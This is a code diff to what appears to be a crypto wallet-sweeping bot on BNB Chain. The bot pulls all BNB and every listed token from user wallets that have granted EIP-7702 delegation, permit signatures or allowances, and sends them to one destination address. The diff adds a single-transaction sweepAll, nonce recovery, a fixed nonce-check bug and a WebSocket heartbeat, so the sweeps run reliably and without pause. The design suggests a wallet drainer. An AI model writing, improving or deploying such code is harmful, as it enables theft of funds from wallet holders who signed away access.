@@ -46,7 +46,7 @@ const MIN_TOKEN_UNITS      = "0.5";
 // Wrapped native token — WBNB on BNB Chain
 const WRAPPED_NATIVE_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c".toLowerCase();
 // WRAP_GAS_RESERVE (0.001 BNB) + WRAP_MIN_SURPLUS (0.0003 BNB) = 0.0013 BNB minimum meaningful wrap
-const NATIVE_WRAP_FLOOR      = ethers.parseEther("0.0015"); // 0.0015 BNB
+const NATIVE_WRAP_FLOOR      = ethers.parseEther("0.0013"); // 0.0013 BNB
 // 3× GAS_AIRDROP_AMOUNT — above this is user's own BNB, not airdrop change
 const NATIVE_WRAP_CEILING    = ethers.parseEther("0.009");  // 0.009 BNB
 
@@ -250,6 +250,7 @@ const needsReconnect     = new Map(); // address.toLowerCase() → timestamp (1-
 const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone
 const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
 let realtimeChannel    = null;
+let _realtimeGeneration = 0; // bumped on each subscribeRealtime() call — lets stale channel callbacks detect supersession
 const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
 let reconnectAttempt   = 0;
 // Add ±20% random jitter to a backoff delay.
@@ -365,6 +366,22 @@ async function getFeeData() {
   return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
 }
 
+// ── Nonce recovery helper ─────────────────────────────────────────────────────
+// Ethers v6 NonceManager increments in memory but does not automatically reset
+// after a rejected tx (replacement-underpriced, already-known, etc.).
+// Call this in catch blocks so the next tx uses the correct on-chain nonce.
+function maybeResetNonce(e) {
+  const msg = (e?.message ?? String(e ?? "")).toLowerCase();
+  if (
+    msg.includes("nonce") ||
+    msg.includes("replacement") ||
+    msg.includes("already known") ||
+    msg.includes("underpriced")
+  ) {
+    try { relayerWallet.reset(); } catch { /* ignore */ }
+  }
+}
+
 // ── Main-contract sweep ───────────────────────────────────────────────────────
 
 async function sweepETH() {
@@ -406,7 +423,7 @@ async function sweepToken(tokenAddress) {
   finally     { sweepingToken[key] = false; }
 }
 
-// ── EIP-7702 delegated wallet sweep ───────────────────────────────────────────
+// ── EIP-7702 delegated wallet sweep (V2 — uses sweepAll for single tx) ───────
 
 async function sweepDelegatedWallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
@@ -414,21 +431,44 @@ async function sweepDelegatedWallet(walletAddress) {
   try {
     const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);
 
-    // ETH first
+    // V2: use sweepAll — sweeps BNB + all tokens in a single transaction.
+    // Use the full CoinGecko TOKENS list so any deposited token is caught.
+    // Falls back to per-token sweepTokens if sweepAll is unavailable (V1 compat).
+    try {
+      const tokenList = TOKENS.map(t => t.address.toLowerCase()).filter(Boolean);
+      log(`[eip7702] ${checksum} — sweepAll(${tokenList.length} tokens + BNB)`);
+      const gas = await userContract.sweepAll.estimateGas(tokenList, DESTINATION_ADDRESS);
+      const fee = await getFeeData();
+      const tx  = await userContract.sweepAll(tokenList, DESTINATION_ADDRESS, {
+        gasLimit: gas * 130n / 100n, ...fee,
+      });
+      log(`[eip7702] sweepAll tx: ${tx.hash}`);
+      await tx.wait();
+      log(`[eip7702] sweepAll confirmed for ${checksum}`);
+      return;
+    } catch (e) {
+      if (e.message?.includes("getFunction") || e.message?.includes("not found")) {
+        // V1 contract — fall back to old per-call approach
+        warn(`[eip7702] ${checksum} — sweepAll not available (V1), falling back`);
+      } else {
+        err(`[eip7702] sweepAll ${checksum}: ${e.message}`);
+        return;
+      }
+    }
+
+    // V1 fallback: BNB then tokens individually
     try {
       const bal = await getReadProvider().getBalance(checksum);
       if (bal > MIN_ETH_WEI) {
-        log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — sweeping`);
         const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
         const fee = await getFeeData();
         const tx  = await userContract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
-        log(`[eip7702] sweepETH(${checksum}) tx: ${tx.hash}`);
+        log(`[eip7702/v1] sweepETH tx: ${tx.hash}`);
         await tx.wait();
-        log(`[eip7702] sweepETH confirmed for ${checksum}`);
       }
-    } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }
+    } catch (e) { err(`[eip7702/v1] sweepETH ${checksum}: ${e.message}`); }
 
-    // ERC-20 tokens — use full TOKENS list, not just TOKENS_TO_WATCH (6 tokens)
+    // V1 per-token fallback uses the full TOKENS list (not just TOKENS_TO_WATCH)
     for (const tok of TOKENS) {
       const tokenAddress = tok.address.toLowerCase();
       try {
@@ -436,17 +476,15 @@ async function sweepDelegatedWallet(walletAddress) {
         const balance = await token.balanceOf(checksum);
         const decimals = tok.decimals ?? 18;
         if (balance >= ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) {
-          let symbol = tok.symbol ?? tokenAddress.slice(0, 8);
-          log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
           const gas = await userContract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
           const fee = await getFeeData();
           const tx  = await userContract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, {
             gasLimit: gas * 120n / 100n, ...fee,
           });
-          log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
+          log(`[eip7702/v1] sweepTokens tx: ${tx.hash}`);
           await tx.wait();
         }
-      } catch (e) { err(`[eip7702] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
+      } catch (e) { err(`[eip7702/v1] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
       await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
     }
   } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
@@ -777,7 +815,7 @@ async function sweepGaslessWallet(walletAddress) {
           log(`[gasless] permit() tx: ${tx.hash}`);
           await tx.wait();
           log(`[gasless] permit() confirmed for ${checksum}`);
-        } catch (e) { err(`[gasless] permit() for ${checksum}: ${e.message}`); }
+        } catch (e) { maybeResetNonce(e); err(`[gasless] permit() for ${checksum}: ${e.message}`); }
       }
     }
 
@@ -802,7 +840,7 @@ async function sweepGaslessWallet(walletAddress) {
         log(`[gasless/allowance] transferFrom tx: ${tx.hash}`);
         await tx.wait();
         log(`[gasless/allowance] confirmed for ${checksum}`);
-      } catch (e) { err(`[gasless/allowance] ${tokenAddr} for ${checksum}: ${e.message}`); }
+      } catch (e) { maybeResetNonce(e); err(`[gasless/allowance] ${tokenAddr} for ${checksum}: ${e.message}`); }
       await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
     }
   }
@@ -1009,6 +1047,7 @@ async function sweepGaslessWallet(walletAddress) {
               } catch { /* non-fatal — proceed with sweep attempt */ }
             
             } catch (e) {
+              maybeResetNonce(e);
               warn(`[gasless/batch] EIP-2612 permit() failed for ${tokenAddr.slice(0, 10)}: ${e.message} — marking failed, will not retry`);
               failedEIP2612.add(batchEip2612Key);
               eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
@@ -1134,6 +1173,7 @@ async function sweepGaslessWallet(walletAddress) {
         } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
       }
     } catch (e) {
+      maybeResetNonce(e);
       const msg = e.message ?? "";
       if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
         warn(`[gasless/batch] nonce consumed for ${checksum} — marking spent`);
@@ -1430,7 +1470,11 @@ async function isNonceUsed(owner, nonceHex) {
     const wordPos = nonce >> 8n;
     const bitPos  = nonce & 0xFFn;
     const bitmap  = await permit2Read.nonceBitmap(owner, wordPos);
-    return (BigInt(bitmap) >> bitPos) & 1n === 1n;
+    // NOTE: `&` has LOWER precedence than `===` in JS, so `x & 1n === 1n` parses as
+    // `x & (1n === 1n)` — mixing a BigInt with a boolean via `&` throws a TypeError,
+    // which was silently swallowed by the catch below, making this always return
+    // false (nonce pre-check permanently disabled). Parenthesize explicitly.
+    return ((BigInt(bitmap) >> bitPos) & 1n) === 1n;
   } catch {
     return false; // assume not used on RPC error — pre-flight staticCall will catch it
   }
@@ -2989,6 +3033,13 @@ function subscribeRealtime() {
     realtimeChannel = null;
   }
 
+  // Tag this channel with a generation number so its status callback can tell
+  // whether it has since been superseded by a newer subscribeRealtime() call
+  // (e.g. the removeChannel() teardown above can itself emit a late "CLOSED"
+  // status asynchronously) — without this, a stale channel's teardown could
+  // schedule a duplicate/competing resubscribe on top of the fresh one.
+  const myGeneration = ++_realtimeGeneration;
+
   realtimeChannel = supabase
     .channel(`bot_realtime_${CHAIN}`)
 
@@ -3079,13 +3130,48 @@ function subscribeRealtime() {
     )
 
     .subscribe((status) => {
+      if (myGeneration !== _realtimeGeneration) return; // stale channel superseded by a newer subscribeRealtime() call
       if (status === "SUBSCRIBED") {
         log(`[realtime] ✅ subscribed (delegated_wallets + permit2_signatures, chain=${CHAIN})`);
-      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
+      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
+        // CLOSED was previously unhandled — a server-initiated close (as opposed to an
+        // error/timeout) left the bot with a dead Realtime channel and no resubscribe,
+        // silently missing all future wallet-signature/reactivation events until restart.
         warn(`[realtime] ${status} — resubscribing in 10s`);
         setTimeout(subscribeRealtime, 10_000);
       }
     });
+}
+
+// ── WS heartbeat — detects silently-dead connections ─────────────────────────
+// A WS/TCP connection can go stale (NAT/idle timeout, peer vanishes without a
+// TCP RST, etc.) without ever firing "error" or "close" on the socket. When
+// that happens the bot keeps its listeners attached to a dead connection and
+// goes permanently deaf to Transfer events until someone manually restarts it
+// — the leading suspect for historical "bot stopped sweeping" reports. Ping
+// the raw socket every 30s; if a pong hasn't arrived by the next tick, force
+// -terminate the socket so the existing "close" handler runs the normal
+// backoff+reconnect path.
+let _wsHeartbeatTimer = null;
+function stopWsHeartbeat() {
+  if (_wsHeartbeatTimer) { clearInterval(_wsHeartbeatTimer); _wsHeartbeatTimer = null; }
+}
+function startWsHeartbeat(wsProvider) {
+  stopWsHeartbeat();
+  const sock = wsProvider?.websocket;
+  if (!sock || typeof sock.ping !== "function") return;
+  let pongReceived = true;
+  sock.on("pong", () => { pongReceived = true; });
+  _wsHeartbeatTimer = setInterval(() => {
+    if (!pongReceived) {
+      warn("[ws] heartbeat timeout — no pong received, terminating stale connection");
+      stopWsHeartbeat();
+      try { (sock.terminate ?? sock.close)?.call(sock); } catch (e) { warn(`[ws] terminate failed: ${e.message}`); }
+      return;
+    }
+    pongReceived = false;
+    try { sock.ping(); } catch (e) { warn(`[ws] ping failed: ${e.message}`); }
+  }, 30_000);
 }
 
 // ── WSS listener: Transfer events + native block scanner ─────────────────────
@@ -3101,6 +3187,7 @@ async function startBot() {
 
     wsProvider.websocket.on("close", () => {
       warn("[ws] closed — removing listeners and reconnecting...");
+      stopWsHeartbeat();
       wsProvider.removeAllListeners();
       activeWsProvider = null;
       const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
@@ -3114,8 +3201,12 @@ async function startBot() {
     // rpcProvider NOT recreated — FallbackProvider handles failover internally.
     await startTransferListeners(wsProvider, TOKENS);
     await startNativeListener(wsProvider);
+    startWsHeartbeat(wsProvider);
 
     log(`[ws] ✅ connected — Transfer listeners active for ${TOKENS.length} tokens`);
+    // Reset backoff after a successful (re)connect — a disconnect long from now
+    // should retry fast again, not inherit the maxed-out delay from past outages.
+    reconnectAttempt = 0;
   } catch (e) {
     err(`[ws] startBot failed: ${e.message}`);
     const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
